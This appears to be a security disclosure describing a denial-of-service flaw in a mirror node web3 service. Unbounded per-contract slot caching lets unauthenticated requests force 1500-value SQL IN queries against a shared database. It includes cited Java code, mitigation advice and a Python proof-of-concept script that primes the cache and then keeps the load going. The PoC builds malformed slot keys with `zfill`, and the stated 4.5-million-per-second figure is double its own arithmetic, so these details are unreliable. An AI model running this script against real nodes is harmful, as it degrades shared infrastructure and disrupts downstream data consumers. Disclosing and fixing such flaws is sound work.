### Title
Cache-Amplified DoS via Unbounded Slot Key Accumulation in `findStorageBatch()`

### Summary
An unprivileged attacker can fill the per-contract `CaffeineCache` (bounded at `maximumSize=1500`) with 1500 unique slot keys for a single `contractId` by issuing 1500 unauthenticated `eth_getStorageAt`-style requests. Once the cache is saturated, every subsequent cache miss for that contract (which occurs every 2 seconds when `contractStateCache` expires) triggers a single SQL `IN` query with all 1500 cached slot keys, creating a sustained 1500× DB query amplification. Because the web3 service and the mirror node record-ingestion pipeline share the same database, this excessive load can cause DB timeouts that delay or drop records exported to mirror node consumers.

### Finding Description

**Exact code path:**

`ContractStateServiceImpl.findStorage()` (line 58–70) checks `contractStateCache` (TTL=2s). On a miss it calls `findStorageBatch()` (line 85–122).

Inside `findStorageBatch()`:
- Line 86–87: retrieves or lazily creates a per-contract `CaffeineCache` whose spec is `"expireAfterAccess=5m,maximumSize=1500"` (from `CacheProperties.slotsPerContract`).
- Line 90: `contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE)` — unconditionally registers the caller-supplied slot key into the per-contract cache.
- Line 91: `cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet()` — collects **all** currently cached slot keys.
- Line 93–101: copies every cached key into `cachedSlots` (no size cap applied here).
- Line 103: `contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots)` — issues one SQL query with `slot IN (…)` containing every accumulated key.

**Root cause:** There is no upper bound enforced on the size of `cachedSlots` before it is passed to the repository. The design assumes the per-contract cache will only accumulate keys that were legitimately accessed together, but an attacker can deliberately inject up to 1500 arbitrary keys, making every future batch query maximally expensive.

**Exploit flow:**
1. Attacker sends 1500 `eth_getStorageAt` (or equivalent EVM `SLOAD`-triggering) requests for a single `contractId`, each with a distinct, never-before-seen 32-byte slot key.
2. Each request misses `contractStateCache` (empty at start) and enters `findStorageBatch()`, adding its key to the per-contract cache. After 1500 requests the cache is at capacity.
3. `contractStateCache` expires after 2 seconds (`expireAfterWrite=2s`).
4. Attacker (or any legitimate user) sends one more request for that contract. `contractStateCache` misses → `findStorageBatch()` is called → `cachedSlots` contains all 1500 keys → DB receives `slot IN (<1500 values>)`.
5. Attacker repeats step 4 every ~2 seconds to sustain the load. The per-contract cache stays alive for 5 minutes (`expireAfterAccess=5m`), so the attacker only needs to re-seed once every 5 minutes.
6. Scaling to the outer `contractSlotsCache` limit of 3000 contracts (`maximumSize=3000`) multiplies the attack: 3000 contracts × 1500 slots × one batch query per 2 s = up to 4.5 million slot lookups per second against the shared DB.

**Why existing checks are insufficient:**
- `enableBatchContractSlotCaching` (line 59) is `true` by default and is a global kill-switch, not a per-request guard.
- `maximumSize=1500` on the per-contract cache is the attacker's target, not a mitigation; it sets the exact ceiling the attacker fills.
- `expireAfterAccess=5m` only resets on access, so continuous attacker traffic keeps the poisoned cache alive indefinitely.
- No authentication, rate limiting, or slot-key validation exists anywhere in the call chain.

### Impact Explanation
The shared PostgreSQL instance serves both the web3 JSON-RPC layer and the mirror node's record-ingestion importer. Sustained large `IN` queries (1500 bind parameters, potentially against a large `contract_state` table) consume DB connection pool slots, CPU, and I/O. Under sufficient load this causes query timeouts in the importer, which can stall consensus record processing and result in gaps in the data exported to downstream mirror node consumers (REST API, gRPC streaming). Severity: **High** — availability impact on a public, unauthenticated endpoint with a direct path to shared infrastructure.

### Likelihood Explanation
The attack requires zero privileges: the web3 JSON-RPC endpoint is publicly accessible. The attacker needs only 1500 HTTP requests (trivially scripted in seconds) to prime the cache, then one request every 2 seconds to sustain the DoS. No special knowledge of the contract's actual storage layout is needed — random 32-byte slot keys suffice because non-existent slots are still registered in the per-contract cache (line 90 runs before the DB query, and the DB simply returns no row for them). The attack is fully repeatable and can be automated.

### Recommendation
1. **Cap `cachedSlots` before the DB call**: enforce a hard maximum (e.g., 100) on the number of keys passed to `findStorageBatch` regardless of cache size, dropping the oldest/least-recently-used entries first.
2. **Separate attacker-controlled keys from organically accumulated keys**: only add a slot key to the per-contract cache after it has been confirmed to exist in the DB (i.e., move `putIfAbsent` to after the DB result is received and the key is found).
3. **Rate-limit per source IP** at the API gateway layer for `eth_getStorageAt` and `eth_call` endpoints.
4. **Reduce `slotsPerContract` maximumSize** to a value that reflects realistic EVM execution patterns (e.g., 50–100) rather than 1500.
5. **Isolate the web3 DB connection pool** from the importer's connection pool so that web3 query saturation cannot starve record ingestion.

### Proof of Concept

```python
import requests, os

TARGET = "http://<mirror-node-web3>:8545"
CONTRACT_ID = "0x<target_contract_address>"

# Step 1: Fill the per-contract cache with 1500 unique slot keys
for i in range(1500):
    slot = hex(i).zfill(66)  # unique 32-byte slot key
    payload = {
        "jsonrpc": "2.0", "method": "eth_getStorageAt",
        "params": [CONTRACT_ID, slot, "latest"], "id": i
    }
    requests.post(TARGET, json=payload)

print("Cache primed with 1500 slots")

# Step 2: Every ~2 seconds, send one request to trigger a 1500-slot batch query
import time
while True:
    payload = {
        "jsonrpc": "2.0", "method": "eth_getStorageAt",
        "params": [CONTRACT_ID, "0x0", "latest"], "id": 9999
    }
    requests.post(TARGET, json=payload)
    # Each call triggers: SELECT slot, value FROM contract_state
    #                     WHERE contract_id = ? AND slot IN (<1500 values>)
    time.sleep(2)
```

Observe DB CPU/IO spike and importer lag in monitoring after step 2 begins. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L85-103)
```java
    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L25-39)
```java
    private String contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats";

    @NotBlank
    private String contractState = "expireAfterWrite=2s,maximumSize=25000,recordStats";

    private boolean enableBatchContractSlotCaching = true;

    @NotBlank
    private String entity = ENTITY_CACHE_CONFIG;

    @NotBlank
    private String fee = "expireAfterWrite=60m,maximumSize=20,recordStats";

    @NotBlank
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L107-112)
```java
    @Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
    CaffeineCacheManager cacheManagerSlotsPerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractStateRepository.java (L23-28)
```java
    @Query(value = """
                    select slot, value from contract_state
                    where contract_id = :contractId
                    and slot in (:slots)
                    """, nativeQuery = true)
    List<ContractSlotValue> findStorageBatch(@Param("contractId") Long contractId, @Param("slots") List<byte[]> slots);
```
